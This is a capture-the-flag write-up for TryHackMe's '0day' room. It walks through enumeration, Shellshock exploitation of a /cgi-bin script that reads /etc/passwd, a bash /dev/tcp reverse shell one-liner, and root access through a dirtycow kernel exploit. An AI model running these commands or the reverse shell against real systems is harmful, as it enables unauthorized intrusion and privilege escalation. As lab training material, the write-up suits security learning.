0day (THM) Write-up

[<img src="../_resources/2b0e552866874d26b15798ba3b97972d.png" alt="THMlogo.png" width="213" height="119" class="jop-noMdConv">](https://tryhackme.com/room/0day)  

![Linked.png](../_resources/dab916cabda74d18a4dd0cda508c7db3.png)


This is new box from [Try Hack Me](https://tryhackme.com/room/0day) which was rated as a medium box.  
To be honest, for me this box was more like an easy box.

## Enumeration
Let's start by scaning the box for open ports using nmap.
**Command:** `nmap -A $IP`
![22db34cb5350febd100eda77a3ec533c.png](../_resources/ee72e3e44a6c48cf96a5197a49efe96e.png)
We can se from the above result that there are only 2 open ports:
**- port 22 SSH**
**- port 80 HTTP**

Visiting the port 80, we can't get to much information from it, just some link for different socials.
![9e8cafa941df713ce58f3fb528e7bc37.png](../_resources/1a31e9595abf48e1b09d02a1cf659d83.png)

Let's start a directory scaning using gobuster.
**Command:** `gobuster dir -u $IP -w /path/to/wordlist/ -x extension type`
![eed0aa0835806446ced3afc8c07afce8.png](../_resources/88c688358581482c8b3d3638d6dc9a4e.png)

Except the 403 result, we have some interesting directories:
**- /admin**
**- /cgi-bin**
**- /js**
**- /css**
**- /img**
**- /uploads**
**- /backup**
**- /robots.txt**
**- /secret**

As expected,the robots.txt file won't help us.
![8006ce5e696d2f7cd579c8eec12f588e.png](../_resources/4da603b02ed445aaad0f817480d2e519.png)

On the **/backup** page we can find a RSA key used for SSH login.
![d5addc522b6e2dae3aea390efc57a0a0.png](../_resources/105084b953ce4e88898ca4f93b1a4a99.png)
I found the passphrase for the RSA key by using JohnTheRipper, but i'm pretty sure that this is a rabbithole.

On the **/secret** page, the creator leaves the same clue as the one on the box page: ***a turtle***.
![46678c184c60b5ea7703c08d8f2188c4.png](../_resources/d2c36abb5b2448f89f2b63ac82cd7173.png)
For those that don't know, there is an exploit called **shellshock** which is usually represented by a turtle or a turtle shell, so this for me was clear on what to do next.

But let's say we didn't knew what that turtle represent or why was there. The next thing to do was to brute force the other directories. The only directory that would have given us a result would be the **/cgi-bin** directory, as shown bellow:

**Command:** `gobuster dir -u $IP/cgi-bin/ -w /path/to/wordlist/ -x sh,cgi`
This time is used **.sh** and **.cgi** as extensions.
![e21feb406c5ff931f90f9ccf4074ea4f.png](../_resources/baab7a698a0742eeb1330fecbc634b05.png)

Now if would not know what to do next, googling for **/cgi-bin exploit** would have put you on the right path.
Let's see if there is a shellshock vulnerability. For this i used an automated tool, but i would recommend you to test it manually so you can understand the exploit.

The tool used by me wall called **shocker** and you can find it on github.
As show in the image below i tried to read **/etc/passwd**, and it worked.
**Command type:** `/bin/cat /etc/passwd`
![11058c7498445af004fde50e3556b483.png](../_resources/8e76d50844304688a77e1ea143598e35.png)

## Foothold
Shell as **www-data**

Now it's time to get a shell on the box. Using the same exploit i could get a reverse shell
**Command:** `/bin/bash -c '/bin/bash -i >& /dev/tcp/$YOUR IP/$YOUR PORT 0>&1'`
Note: To get a stable shell use the next commmands:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
press **CTRL+Z** then type `stty raw -echo` and finally type `fg`
`export TERM=xterm`
![8480769e9f44617e13b4772747c4426b.png](../_resources/03566ff467f042918e959e974f54c3e8.png)

## Privilege escalation
If you use **linpeas** and read the results, you can clearly see what's the path to exploit this box to get root: **kernel exploit**
![4be0f384a790cf0d0d35e508d7b3b45c.png](../_resources/a81d7c969b25423abdb24999e2efa245.png)
This is an old kernel **3.13.0-32-generic**. If you would access the link that linpeas suggests for kernel exploit, you would find a github link for different variation of the **dirtycow** exploit.
**Link:** [https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

Shell as **root**
I used the the **cowroot** one, which worked for me but was unstable. I didn't tried other variants of the exploit because i was able to read the root.txt flag.
![f074d15262013473759f9924d2faf00c.png](../_resources/ad8d1f1c66b94ba585abac2dc848a2a6.png)

## Flags
![e91b0e4918e2fce413e4a5ccfbaabbac.png](../_resources/4776d038acca4b22abf5a490552c5e73.png)